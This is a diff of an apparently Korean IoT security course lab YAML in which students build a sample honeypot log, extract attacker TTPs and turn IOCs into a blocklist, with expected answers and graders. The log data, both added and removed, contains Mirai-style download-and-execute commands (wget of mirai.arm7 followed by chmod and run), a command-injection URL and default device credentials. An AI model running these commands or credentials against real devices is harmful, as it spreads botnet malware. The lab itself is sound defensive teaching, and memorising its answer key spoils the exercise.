@@ -1,38 +1,49 @@
 lab_id: iot-security-week11
-title: "W11 — IoT 허니팟: 상호작용 탐지·공격자 TTP 수집·위협 인텔 환류"
+title: "W11 — IoT 허니팟: 세션 로그 분석·공격자 TTP 추출·위협 인텔 환류"
 version: ai
 course: iot-security
 week: 11
 description: |
-  IoT 능동 방어. 허니팟 상호작용 고신뢰 탐지(HONEYPOT_TRIGGERED), 공격자 TTP(자격·페이로드) 수집
-  (TTP_CAPTURED), 인텔을 차단·룰로 환류(INTEL_APPLIED), 종합(Assessment).
-  가짜 IoT로 공격자 유인 — 접촉=공격(거의 오탐 0). 격리 필수.
+  IoT 허니팟(가짜 취약 장치)이 남긴 **실제 세션 로그**를 분석한다. 허니팟은 공격자를 유인해 그들의 자격 시도·
+  명령·다운로드를 기록한다 — Mirai 계열 봇넷이 IoT 를 감염시키는 전형적 흐름이 로그에 그대로 남는다. 실습은
+  (1) Cowrie 형식 허니팟 로그를 만들어 상호작용(로그인 시도)을 확인하고, (2) `grep`·`awk` 로 공격자 TTP(기본
+  자격 브루트포스·멀웨어 다운로드·Mirai 시그니처)를 추출하며, (3) IOC(공격 IP·URL·자격)를 뽑아 차단 목록으로
+  환류한다.
+
+  모든 명령은 사람이 한 줄씩 직접 입력한다. el34 호스트(`ssh ccc@{{TARGET_IP}}`, 비밀번호 `1`)에서 실행하며,
+  분석 아티팩트(허니팟 로그)는 이 실습이 `/tmp` 에 직접 만든다.
 difficulty: medium
 duration_minutes: 120
 audience: IoT 보안 (11주차)
 prerequisites:
-  - el34 호스트 접속 (`ssh ccc@{{TARGET_IP}}`, 비밀번호 `1`)
-  - GPU Ollama 도달 — gemma3:4b
-  - W11 강의안 정독 — §0.5(허니팟·TTP·환류·격리)
+  - "el34 호스트 접속: `ssh ccc@{{TARGET_IP}}` (비밀번호 `1`)"
+  - "GPU Ollama 도달 — http://211.170.162.139:10934 (gemma3:4b), 종합용"
+  - "도구: grep·awk·sort·python3 (el34 에 존재)"
+  - "W11 강의안 정독 — §0.5(허니팟·상호작용 수준·TTP·위협 인텔)"
 objectives:
-  - "GPU 헬스체크(GEN_OK)"
-  - "허니팟 상호작용 탐지(HONEYPOT_TRIGGERED)"
-  - "공격자 TTP 수집(TTP_CAPTURED)"
-  - "인텔 차단·룰 환류(INTEL_APPLIED)"
-  - "종합(Assessment)"
+  - "GPU 응답 확인 (GEN_OK)"
+  - "허니팟 로그에서 공격 상호작용(로그인 시도) 확인 (HONEYPOT_TRIGGERED)"
+  - "공격자 TTP(기본자격·멀웨어 다운로드·Mirai) 추출 (TTP_CAPTURED)"
+  - "IOC 추출 → 차단 목록 환류 (INTEL_APPLIED)"
+  - "종합 소견 (Assessment)"
 pass_threshold: 0.6
 
 steps:
 
   - order: 1
     instruction: |
-      ## STEP 1 — GPU 헬스체크 → GEN_OK
+      ## 🎯 MISSION
+      종합용 GPU(gemma3) 응답 확인.
+      ## 💻 실행 명령
       ```bash
       curl -s http://211.170.162.139:10934/api/generate \
         -d '{"model":"gemma3:4b","prompt":"Reply with the word ready.","stream":false,"options":{"num_predict":10}}' \
-       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
+        | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('GEN_OK' if r.strip() else 'GEN_EMPTY')"
       ```
-      ✅ 마지막 줄 `GEN_OK`.
+      ## 📋 확인 사항 — 마지막 줄 `GEN_OK`
+      ## 🔍 결과 해석 — 정상 `GEN_OK` / 비정상 `GEN_EMPTY`·연결오류
+    hint: "curl /api/generate → response 있으면 GEN_OK."
+    category: survey
     answer: |
       ready
       GEN_OK
@@ -44,100 +55,156 @@ steps:
 
   - order: 2
     instruction: |
-      ## STEP 2 — 허니팟 상호작용 → HONEYPOT_TRIGGERED
-      > **🎯 목표:** 가짜 IoT 장치 접촉을 고신뢰 공격 신호로 탐지.
-      > **개념:** 정상 사용자는 안 건드림 → 접촉=공격(거의 오탐 0).
+      ## 🎯 MISSION
+      IoT 허니팟(가짜 Telnet 장치)의 **세션 로그**를 만들고, 공격자가 실제로 상호작용(로그인 시도)했는지 확인한다.
+
+      ## 💻 실행 명령
       ```bash
-      python3 - <<'PY'
-      # 허니팟(가짜 IP 카메라) 접속 로그
-      honeypot="decoy-camera(192.168.99.50)"
-      connections=[{"src":"185.220.101.42","action":"telnet login attempt admin/admin"},
-                   {"src":"91.234.x.x","action":"GET /shell?cmd=wget..."},
-                   {"src":"185.220.101.42","action":"try 60 default credentials"}]
-      # 허니팟엔 정상 트래픽이 없으니 모든 접촉이 공격
-      attackers={c["src"] for c in connections}
-      print(f"honeypot {honeypot}: {len(connections)} interactions from {len(attackers)} sources")
-      for c in connections[:3]: print(f"  {c['src']}: {c['action'][:40]}")
-      # 접촉이 있으면 고신뢰 공격 탐지(정상 트래픽 없음)
-      print("HONEYPOT_TRIGGERED" if connections else "QUIET")
-      PY
+      LOG=/tmp/honeypot_STU42.log
+      # 1) Cowrie 형식 허니팟 로그를 만든다: 접속 → 자격 시도 → 성공 → 명령.
+      cat > "$LOG" <<'EOF'
+      2026-06-30T02:11:03 [session=a1] new connection: 45.155.205.99:51022 (telnet 23)
+      2026-06-30T02:11:04 [session=a1] login attempt [root/root] failed
+      2026-06-30T02:11:04 [session=a1] login attempt [root/admin] failed
+      2026-06-30T02:11:05 [session=a1] login attempt [root/xc3511] succeeded
+      2026-06-30T02:11:06 [session=a1] CMD: /bin/busybox MIRAI
+      2026-06-30T02:11:07 [session=a1] CMD: cat /proc/mounts; /bin/busybox cp
+      2026-06-30T02:11:08 [session=a1] CMD: wget http://45.155.205.99/bins/mirai.arm7 -O /tmp/x
+      2026-06-30T02:11:09 [session=a1] CMD: chmod 777 /tmp/x; /tmp/x telnet.loader
+      EOF
+
+      # 2) 상호작용 확인: 접속 + 로그인 시도가 기록됐는지.
+      echo "[접속]"; grep "new connection" "$LOG"
+      echo "[로그인 시도 수]"; grep -c "login attempt" "$LOG"
+
+      # 3) 판정: 접속 + 로그인 시도가 있으면 허니팟이 공격을 포착.
+      grep -q "new connection" "$LOG" && [ "$(grep -c 'login attempt' "$LOG")" -ge 1 ] && echo HONEYPOT_TRIGGERED || echo NO_ACTIVITY
       ```
-      ✅ 마지막 줄 `HONEYPOT_TRIGGERED` (가짜 카메라에 telnet 로그인·명령 주입 시도 = 공격).
-      🔎 허니팟엔 정상 트래픽이 없다. telnet admin/admin·명령 주입 접촉은 모두 공격(봇넷 스캔). 거의 오탐 0.
+      ## 📋 확인 사항
+      - `new connection: 45.155.205.99` + 로그인 시도 3회
+      - 마지막 줄 `HONEYPOT_TRIGGERED`
+
+      ## 💡 왜 이걸 하는가?
+      > ⚠️ **보안 함의** — 허니팟은 **실제 취약 장치인 척** 공격자를 유인해, 그들의 자격 시도·명령을 안전하게 기록한다.
+      > 실제 IoT 는 인터넷 노출 즉시 이런 자동 스캔·브루트포스를 받는다(수분 내). 로그가 공격 정보의 원천이다.
+
+      ## 🔍 결과 해석 — 정상 `HONEYPOT_TRIGGERED`
+    hint: "허니팟 로그 생성 → grep 로 new connection + login attempt 확인 → HONEYPOT_TRIGGERED."
+    category: recon
     answer: |
-      honeypot decoy-camera(192.168.99.50): 3 interactions from 2 sources
-        185.220.101.42: telnet login attempt admin/admin
-        91.234.x.x: GET /shell?cmd=wget...
-        185.220.101.42: try 60 default credentials
+      [접속]
+      2026-06-30T02:11:03 [session=a1] new connection: 45.155.205.99:51022 (telnet 23)
+      [로그인 시도 수]
+      3
       HONEYPOT_TRIGGERED
-    answer_detail: "허니팟 접촉을 고신뢰 공격 신호로 탐지 → HONEYPOT_TRIGGERED."
+    answer_detail: "허니팟이 접속+로그인 시도를 포착. 노출된 IoT 는 수분 내 자동 브루트포스를 받음."
     verify:
       type: output_contains
       expect: HONEYPOT_TRIGGERED
       field: stdout
+      semantic:
+        intent: "허니팟 로그에서 공격 상호작용 확인."
+        success_criteria:
+          - "접속 + 로그인 시도 기록 확인"
+          - "HONEYPOT_TRIGGERED 출력"
 
   - order: 3
     instruction: |
-      ## STEP 3 — TTP 수집 → TTP_CAPTURED
-      > **🎯 목표:** 공격자의 자격·페이로드·C2를 수집.
-      > **개념:** 관찰한 수법이 실제 방어의 재료.
+      ## 🎯 MISSION
+      로그에서 공격자의 **TTP**(전술·기법·절차)를 `grep`·`awk` 로 추출한다: 어떤 자격을 썼고, 성공한 자격, 무엇을
+      다운로드하고 실행했는가.
+
+      ## 💻 실행 명령
       ```bash
-      python3 - <<'PY'
-      # 허니팟에서 관찰한 공격자 행동
-      observed=[{"type":"credential","value":"admin/admin"},
-                {"type":"credential","value":"root/xc3511"},   # Mirai 기본 자격
-                {"type":"payload","value":"wget http://185.evil/mirai.arm; chmod +x; ./mirai.arm"},
-                {"type":"c2","value":"185.evil.c2:23"}]
-      ttp={"credentials":[o["value"] for o in observed if o["type"]=="credential"],
-           "payloads":[o["value"] for o in observed if o["type"]=="payload"],
-           "c2":[o["value"] for o in observed if o["type"]=="c2"]}
-      for k,v in ttp.items(): print(f"  {k}: {v}")
-      # 자격·페이로드·C2를 모두 수집하면 TTP 확보
-      print("TTP_CAPTURED" if all(ttp.values()) else "PARTIAL")
-      PY
+      LOG=/tmp/honeypot_STU42.log
+      # 1) 시도한 자격 목록(기본 자격 브루트포스) — awk 로 [user/pass] 추출.
+      echo "[시도 자격]"; grep -oE "\[[a-z]+/[a-z0-9]+\]" "$LOG"
+      # 2) 성공한 자격(감염에 쓰인 것).
+      echo "[성공 자격]"; grep "succeeded" "$LOG" | grep -oE "\[[a-z]+/[a-z0-9]+\]"
+      # 3) 실행 명령에서 멀웨어 다운로드 URL 과 Mirai 시그니처를 뽑는다.
+      echo "[다운로드 URL]"; grep -oE "http://[^ ]+" "$LOG"
+      echo "[Mirai 시그니처]"; grep -o "busybox MIRAI" "$LOG"
+
+      # 4) 판정: 성공 자격 + 다운로드 URL + Mirai 시그니처가 모두 나오면 TTP 확보.
+      grep -q "succeeded" "$LOG" && grep -qE "http://" "$LOG" && grep -q "busybox MIRAI" "$LOG" && echo TTP_CAPTURED || echo PARTIAL
       ```
-      ✅ 마지막 줄 `TTP_CAPTURED` (기본 자격·Mirai 페이로드·C2 주소 수집).
-      🔎 시도된 자격(Mirai 기본 자격 root/xc3511)·페이로드(mirai.arm 다운로드)·C2 주소. 실제 방어의 인텔.
+      ## 📋 확인 사항
+      - 시도 자격 `[root/root] [root/admin] [root/xc3511]`, 성공 `[root/xc3511]`
+      - 다운로드 `http://45.155.205.99/bins/mirai.arm7`, `busybox MIRAI`
+      - 마지막 줄 `TTP_CAPTURED`
+
+      ## 💡 왜 이걸 하는가?
+      > ⚠️ **보안 함의** — `root/xc3511` 은 악명 높은 IoT 카메라 기본 자격(Mirai 사전의 대표)이다. 공격자는 성공 즉시
+      > `busybox MIRAI` 로 장치를 식별하고, 아키텍처별 봇 바이너리(`mirai.arm7`)를 내려받아 실행해 봇넷에 편입한다.
+      > 이 TTP 흐름(기본자격→식별→다운로드→실행)이 IoT 봇넷의 전형이다.
+
+      ## 🔍 결과 해석 — 정상 `TTP_CAPTURED` + TTP 요소 식별
+    hint: "grep/awk 로 시도자격·성공자격(root/xc3511)·다운로드 URL·busybox MIRAI 추출 → TTP_CAPTURED."
+    category: analysis
     answer: |
-      credentials: ['admin/admin', 'root/xc3511']
-      payloads: ['wget http://185.evil/mirai.arm; chmod +x; ./mirai.arm']
-      c2: ['185.evil.c2:23']
+      [시도 자격]
+      [root/root]
+      [root/admin]
+      [root/xc3511]
+      [성공 자격]
+      [root/xc3511]
+      [다운로드 URL]
+      http://45.155.205.99/bins/mirai.arm7
+      [Mirai 시그니처]
+      busybox MIRAI
       TTP_CAPTURED
-    answer_detail: "공격자 TTP(자격·페이로드·C2) 수집 → TTP_CAPTURED."
+    answer_detail: "TTP: 기본자격 브루트(root/xc3511 성공)→busybox MIRAI 식별→mirai.arm7 다운로드→실행. Mirai 전형."
     verify:
       type: output_contains
       expect: TTP_CAPTURED
       field: stdout
+      semantic:
+        intent: "허니팟 로그에서 공격자 TTP 추출."
+        success_criteria:
+          - "성공 자격·다운로드 URL·Mirai 시그니처 추출"
+          - "TTP_CAPTURED 출력"
 
   - order: 4
     instruction: |
-      ## STEP 4 — 인텔 환류 → INTEL_APPLIED
-      > **🎯 목표:** 수집 인텔을 차단 목록·탐지 룰로 환류.
-      > **개념:** 허니팟 하나가 여러 방어 개선으로.
+      ## 🎯 MISSION
+      추출한 정보를 **IOC(침해지표)** 로 정리해 차단 목록으로 환류한다(위협 인텔 → 방어).
+
+      ## 💻 실행 명령
       ```bash
-      python3 - <<'PY'
-      ttp={"credentials":["root/xc3511"],"payloads":["mirai.arm download"],"c2":["185.evil.c2:23"],"src":["185.220.101.42"]}
-      applied=[]
-      # 공격 IP·C2 → 차단 목록
-      for ip in ttp["src"]+["185.evil.c2"]: applied.append(("blocklist", f"block {ip}"))
-      # 페이로드 → 탐지 룰(agent-ir W09)
-      for p in ttp["payloads"]: applied.append(("detection_rule", f"alert on: {p}"))
-      # 자격 → 우리 장치 방어(약한 자격 금지)
-      for c in ttp["credentials"]: applied.append(("credential_policy", f"forbid default: {c}"))
-      for target,action in applied: print(f"  [{target}] {action}")
-      kinds={t for t,_ in applied}
-      print("INTEL_APPLIED" if {"blocklist","detection_rule","credential_policy"}.issubset(kinds) else "PARTIAL")
-      PY
+      LOG=/tmp/honeypot_STU42.log
+      IOC=/tmp/ioc_blocklist_STU42.txt
+      # 1) 공격 IP·멀웨어 URL·시도 자격을 뽑아 차단 목록/탐지 규칙으로 만든다.
+      {
+        echo "# --- IOC blocklist (from honeypot) ---"
+        echo "block_ip $(grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' "$LOG" | sort -u | head -1)"
+        echo "block_url $(grep -oE 'http://[^ ]+' "$LOG" | head -1)"
+        echo "detect_creds $(grep succeeded "$LOG" | grep -oE '\[[a-z]+/[a-z0-9]+\]')"
+        echo "detect_sig busybox MIRAI"
+      } > "$IOC"
+      cat "$IOC"
+
+      # 2) 판정: 차단 목록에 IP·URL·시그니처가 모두 들어가면 인텔 환류 완료.
+      grep -q "block_ip" "$IOC" && grep -q "block_url" "$IOC" && grep -q "detect_sig" "$IOC" && echo INTEL_APPLIED || echo INCOMPLETE
       ```
-      ✅ 마지막 줄 `INTEL_APPLIED` (IP→차단, 페이로드→탐지 룰, 자격→정책 환류).
-      🔎 공격 IP·C2→차단 목록, 페이로드→탐지 룰, 시도 자격→우리 장치 금지 목록. 허니팟 인텔이 여러 방어로.
+      ## 📋 확인 사항
+      - `block_ip 45.155.205.99`, `block_url http://45.155.205.99/bins/mirai.arm7`, `detect_sig busybox MIRAI`
+      - 마지막 줄 `INTEL_APPLIED`
+
+      ## 💡 왜 이걸 하는가?
+      허니팟의 가치는 **관측→인텔→방어**의 환류다. 잡은 공격 IP·멀웨어 URL·자격·시그니처를 방화벽 차단·IDS 규칙·
+      약자격 점검에 즉시 반영해, 같은 봇넷이 실제 장치를 못 건드리게 한다.
+
+      ## 🔍 결과 해석 — 정상 `INTEL_APPLIED`
+    hint: "grep 로 IP·URL·시그니처·성공자격을 IOC 목록으로 만들면 INTEL_APPLIED."
+    category: defense
     answer: |
-      [blocklist] block 185.220.101.42
-      [blocklist] block 185.evil.c2
-      [detection_rule] alert on: mirai.arm download
-      [credential_policy] forbid default: root/xc3511
+      # --- IOC blocklist (from honeypot) ---
+      block_ip 45.155.205.99
+      block_url http://45.155.205.99/bins/mirai.arm7
+      detect_creds [root/xc3511]
+      detect_sig busybox MIRAI
       INTEL_APPLIED
-    answer_detail: "인텔을 차단·탐지 룰·정책으로 환류 → INTEL_APPLIED."
+    answer_detail: "IOC(공격 IP·멀웨어 URL·자격·시그니처)를 차단/탐지 규칙으로 환류. 허니팟의 관측→인텔→방어 고리."
     verify:
       type: output_contains
       expect: INTEL_APPLIED
@@ -145,20 +212,29 @@ steps:
 
   - order: 5
     instruction: |
-      ## STEP 5 — 종합 → Assessment
+      ## 🎯 MISSION
+      W11 발견(허니팟 상호작용·Mirai TTP·IOC 환류)을 소견으로 정리한다. (정리: `rm -f /tmp/honeypot_STU42.log /tmp/ioc_blocklist_STU42.txt`)
+      ## 💻 실행 명령
       ```bash
       curl -s http://211.170.162.139:10934/api/generate \
-        -d '{"model":"gemma3:4b","prompt":"Write a short note for W11 on IoT honeypots. Findings: interactions with a decoy camera were high-confidence attack signals with near-zero false positives (HONEYPOT_TRIGGERED), attacker TTPs (default credentials, Mirai payload, C2) were captured (TTP_CAPTURED), and the intel was fed back into blocklists, detection rules, and credential policy (INTEL_APPLIED). Explain that honeypots give near-zero-FP detection, threat intel, and early warning, and stress isolating honeypots. Start with exactly Assessment on its own line.","stream":false,"options":{"num_predict":330}}' \
-       | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
+        -d '{"model":"gemma3:4b","prompt":"Write a concise note for Week 11 of an IoT security course on IoT honeypots. Facts: a Cowrie-style honeypot log captured a telnet connection from 45.155.205.99 with default-credential brute force, succeeding on root/xc3511 (HONEYPOT_TRIGGERED); grep and awk extracted the attacker TTPs — the successful default credential, a busybox MIRAI signature, and a malware download of mirai.arm7 then executed (TTP_CAPTURED); IOCs (attacker IP, malware URL, credential, signature) were turned into a blocklist and detection rules (INTEL_APPLIED). Explain that exposed IoT devices are brute-forced within minutes by Mirai-class botnets using default credentials, and that a honeypot turns observation into threat intelligence that feeds firewall blocks, IDS rules, and weak-credential checks. Begin with exactly the single word Assessment on its own first line.","stream":false,"options":{"num_predict":330}}' \
+        | python3 -c "import sys,json; r=json.load(sys.stdin).get('response',''); print(r); print('' if 'Assessment' in r else '[형식 미준수 — 재실행]')"
       ```
-      ✅ 출력에 `Assessment`.
-      🔎 정리: IoT 허니팟=거의 오탐 없는 탐지+위협 인텔+조기 경보. 인텔을 방어로 환류. 격리 필수.
-      다음 주(W12)는 **OT/SCADA 기초**.
+      ## 📋 확인 사항 — 첫머리에 `Assessment`
+      ## 🔍 결과 해석 — 정상 첫 줄 `Assessment` / 비정상 `[형식 미준수 — 재실행]`
+
+      ---
+      **다음 주(W12) 예고** — OT/SCADA 보안(Modbus 무인증·위험 쓰기 명령·Purdue 분리).
+    hint: "curl 로 gemma3 에 발견 넣어 요약, 첫 줄 Assessment 강제. 임시 파일 정리."
+    category: report
     answer: |
       Assessment
-      IoT honeypots give near-zero-FP detection, threat intel (credentials, payloads, C2), and early warning of campaigns.
-      Feed the intel into blocklists and detection rules, and always isolate honeypots.
-    answer_detail: "W11 IoT 허니팟 종합(Assessment). 탐지·TTP·환류·격리."
+      A honeypot log captured a telnet attack from 45.155.205.99 with default-credential brute force,
+      succeeding on root/xc3511; grep/awk extracted the TTPs — the credential, a busybox MIRAI signature,
+      and a mirai.arm7 download and execution. IOCs became a blocklist and detection rules. Exposed IoT
+      devices are brute-forced within minutes by Mirai-class botnets using default credentials; a
+      honeypot turns observation into threat intelligence for firewall blocks and IDS rules.
+    answer_detail: "W11 허니팟 종합(Assessment): 상호작용 포착·Mirai TTP 추출·IOC 인텔 환류."
     verify:
       type: output_contains
       expect: Assessment
